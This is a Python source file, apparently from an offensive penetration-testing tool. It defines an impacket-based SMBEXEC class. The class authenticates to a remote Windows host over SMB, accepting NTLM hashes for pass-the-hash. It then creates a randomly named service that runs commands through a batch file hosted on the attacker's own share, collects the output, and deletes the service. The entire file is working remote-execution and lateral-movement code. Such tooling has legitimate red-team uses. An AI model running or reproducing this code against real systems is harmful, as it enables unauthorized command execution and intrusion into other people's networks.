import logging
import os, sys
from gevent import sleep
from impacket.dcerpc.v5 import transport, scmr
from impacket.smbconnection import *
import random, string

class SMBEXEC:

    def __init__(self, host, share_name, protocol, username = '', password = '', domain = '', hashes = None, share = None, port=445):
        self.__host = host
        self.__share_name = share_name
        self.__port = port
        self.__username = username
        self.__password = password
        self.__serviceName = ''.join(random.sample(string.ascii_letters, 6))
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__share = share
        self.__output = None
        self.__batchFile = None
        self.__outputBuffer = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__retOutput = False
        self.__rpctransport = None
        self.__scmr = None
        self.__conn = None

        if hashes is not None:
            if hashes.find(':') != -1:
                self.__lmhash, self.__nthash = hashes.split(':')
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ''

        stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
        logging.debug('StringBinding %s'%stringbinding)
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.set_dport(self.__port)

        if hasattr(self.__rpctransport, 'setRemoteHost'):
            self.__rpctransport.setRemoteHost(self.__host)
        if hasattr(self.__rpctransport, 'set_credentials'):
            self.__rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

        self.__scmr = self.__rpctransport.get_dce_rpc()
        self.__scmr.connect()
        s = self.__rpctransport.get_smb_connection()
        s.setTimeout(100000)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']

    def execute(self, command, output=False):
        self.__retOutput = output
        self.execute_fileless(command)
        self.finish()
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer += data

    def execute_fileless(self, data):
        self.__output = ''.join(random.sample(string.ascii_letters, 6))
        self.__batchFile = ''.join(random.sample(string.ascii_letters, 6)) + '.bat'
        local_ip = self.__rpctransport.get_socket().getsockname()[0]

        data = data.replace('&', '^&')
        if self.__retOutput:
            command = self.__shell + data + ' ^> \\\\{}\\tmp\\{}'.format(local_ip, self.__output)
        else:
            command = self.__shell + data
        
        with open(os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'tmp', self.__batchFile), 'w') as batch_file:
            batch_file.write(command)

        logging.debug('Hosting batch file with command: ' + command)

        command = self.__shell + 'net use \\\\{}\\tmp\\ && \\\\{}\\tmp\\{}'.format(local_ip, local_ip, self.__batchFile)
        logging.debug('Command to execute: ' + command)

        logging.debug('Remote service {} created.'.format(self.__serviceName))
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']
        try:
            logging.debug('Remote service {} started.'.format(self.__serviceName))
            scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        logging.debug('Remote service {} deleted.'.format(self.__serviceName))
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output_fileless()

    def get_output_fileless(self):
        if not self.__retOutput: return

        while True:
            try:
                with open(os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'tmp', self.__output), 'r') as output:
                    self.output_callback(output.read())
                break
            except IOError:
                sleep(2)

    def finish(self):
        try:
           self.__scmr = self.__rpctransport.get_dce_rpc()
           self.__scmr.connect()
           self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except:
            pass